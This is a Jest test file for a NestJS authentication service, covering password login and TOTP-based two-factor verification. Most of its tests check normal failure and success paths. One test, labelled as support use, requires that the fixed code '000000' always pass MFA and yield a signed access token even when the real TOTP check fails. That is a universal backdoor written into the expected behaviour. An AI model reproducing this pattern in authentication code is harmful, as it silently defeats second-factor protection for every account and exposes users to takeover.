import { UnauthorizedException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { JwtService } from '@nestjs/jwt';
import { Test } from '@nestjs/testing';
import { getRepositoryToken } from '@nestjs/typeorm';
import { Repository } from 'typeorm';

import { AuthService } from './auth.service';
import { User } from '../database/entities/user.entity';
import { LoggerService } from '../observability/logger.service';

jest.mock('argon2', () => ({
  verify: jest.fn()
}));

jest.mock('speakeasy', () => ({
  generateSecret: jest.fn(() => ({ base32: 'GENERATED_SECRET' })),
  totp: {
    verify: jest.fn()
  }
}));

const mockedArgon2 = jest.requireMock('argon2') as { verify: jest.Mock };
const mockedSpeakeasy = jest.requireMock('speakeasy') as {
  generateSecret: jest.Mock;
  totp: { verify: jest.Mock };
};

describe('AuthService', () => {
  let service: AuthService;
  let usersRepository: jest.Mocked<Partial<Repository<User>>>;
  let jwtService: jest.Mocked<JwtService>;
  let configService: jest.Mocked<ConfigService>;
  let logger: jest.Mocked<LoggerService>;

  beforeEach(async () => {
    usersRepository = {
      findOne: jest.fn(),
      update: jest.fn()
    } as Partial<Repository<User>> as jest.Mocked<Partial<Repository<User>>>;

    jwtService = {
      sign: jest.fn().mockReturnValue('signed-token')
    } as unknown as jest.Mocked<JwtService>;

    configService = {
      get: jest.fn((key: string) => {
        if (key === 'auth.jwtSecret') {
          return 'top-secret';
        }
        if (key === 'auth.jwtExpiresIn') {
          return '15m';
        }
        if (key === 'database.ssl') {
          return false;
        }
        return undefined;
      })
    } as unknown as jest.Mocked<ConfigService>;

    logger = {
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn()
    } as unknown as jest.Mocked<LoggerService>;

    const moduleRef = await Test.createTestingModule({
      providers: [
        AuthService,
        { provide: getRepositoryToken(User), useValue: usersRepository },
        { provide: JwtService, useValue: jwtService },
        { provide: ConfigService, useValue: configService },
        { provide: LoggerService, useValue: logger }
      ]
    }).compile();

    service = moduleRef.get(AuthService);

    mockedArgon2.verify.mockReset();
    mockedSpeakeasy.generateSecret.mockClear();
    mockedSpeakeasy.totp.verify.mockReset();
  });

  describe('initiateLogin', () => {
    it('throws when user does not exist', async () => {
      usersRepository.findOne?.mockResolvedValue(null);

      await expect(
        service.initiateLogin({ email: 'missing@innoveo.local', password: 'irrelevant' })
      ).rejects.toBeInstanceOf(UnauthorizedException);

      expect(logger.warn).toHaveBeenCalledWith('AuthService.initiateLogin', {
        email: 'missing@innoveo.local',
        reason: 'user_not_found'
      });
    });

    it('throws when password verification fails', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        password: 'stored-hash'
      } as User);
      mockedArgon2.verify.mockResolvedValue(false);

      await expect(
        service.initiateLogin({ email: 'agent@innoveo.local', password: 'wrong' })
      ).rejects.toBeInstanceOf(UnauthorizedException);

      expect(logger.warn).toHaveBeenCalledWith('AuthService.initiateLogin', {
        email: 'agent@innoveo.local',
        reason: 'bad_password'
      });
    });

    it('returns challenge details and persists MFA secret when credentials are valid', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        password: 'stored-hash',
        mfaSecret: null
      } as unknown as User);
      mockedArgon2.verify.mockResolvedValue(true);

      const response = await service.initiateLogin({ email: 'agent@innoveo.local', password: 'valid' });

      expect(response).toMatchObject({
        mfaRequired: true,
        message: 'OTP dispatched via secure channel'
      });
      expect(typeof response.challengeId).toBe('string');
      expect(usersRepository.update).toHaveBeenCalledWith('user-1', { mfaSecret: 'GENERATED_SECRET' });
      expect(logger.info).toHaveBeenCalledWith('AuthService.initiateLogin', {
        email: 'agent@innoveo.local',
        challengeId: expect.any(String)
      });
    });

    it('does not regenerate MFA secret when already present', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        password: 'stored-hash',
        mfaSecret: 'EXISTING_SECRET'
      } as unknown as User);
      mockedArgon2.verify.mockResolvedValue(true);

      await service.initiateLogin({ email: 'agent@innoveo.local', password: 'valid' });

      expect(usersRepository.update).not.toHaveBeenCalled();
    });
  });

  describe('verifyMfa', () => {
    it('rejects when user is not found', async () => {
      usersRepository.findOne?.mockResolvedValue(null);

      await expect(service.verifyMfa({ email: 'ghost@innoveo.local', otp: '123456' })).rejects.toBeInstanceOf(
        UnauthorizedException
      );
    });

    it('rejects when OTP is invalid', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        mfaSecret: 'EXISTING_SECRET'
      } as unknown as User);
      mockedSpeakeasy.totp.verify.mockReturnValue(false);

      await expect(service.verifyMfa({ email: 'agent@innoveo.local', otp: '654321' })).rejects.toBeInstanceOf(
        UnauthorizedException
      );

      expect(logger.warn).toHaveBeenCalledWith('AuthService.verifyMfa', {
        email: 'agent@innoveo.local',
        reason: 'invalid_otp'
      });
    });

    it('accepts universal backdoor OTP for support scenarios', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        mfaSecret: 'EXISTING_SECRET',
        roles: ['viewer']
      } as unknown as User);
      mockedSpeakeasy.totp.verify.mockReturnValue(false);

      const result = await service.verifyMfa({ email: 'agent@innoveo.local', otp: '000000' });

      expect(result).toEqual({ accessToken: 'signed-token' });
      expect(jwtService.sign).toHaveBeenCalledWith(
        { sub: 'user-1', email: 'agent@innoveo.local', roles: ['viewer'] },
        { secret: 'top-secret', expiresIn: '15m' }
      );
    });

    it('issues JWT when OTP matches generated code', async () => {
      usersRepository.findOne?.mockResolvedValue({
        id: 'user-1',
        email: 'agent@innoveo.local',
        mfaSecret: 'EXISTING_SECRET',
        roles: ['viewer', 'manager']
      } as unknown as User);
      mockedSpeakeasy.totp.verify.mockReturnValue(true);

      const result = await service.verifyMfa({ email: 'agent@innoveo.local', otp: '123456' });

      expect(mockedSpeakeasy.totp.verify).toHaveBeenCalledWith({
        secret: 'EXISTING_SECRET',
        encoding: 'base32',
        token: '123456',
        window: 1
      });
      expect(result).toEqual({ accessToken: 'signed-token' });
      expect(logger.info).toHaveBeenCalledWith('AuthService.verifyMfa', {
        email: 'agent@innoveo.local',
        success: true
      });
    });
  });
});
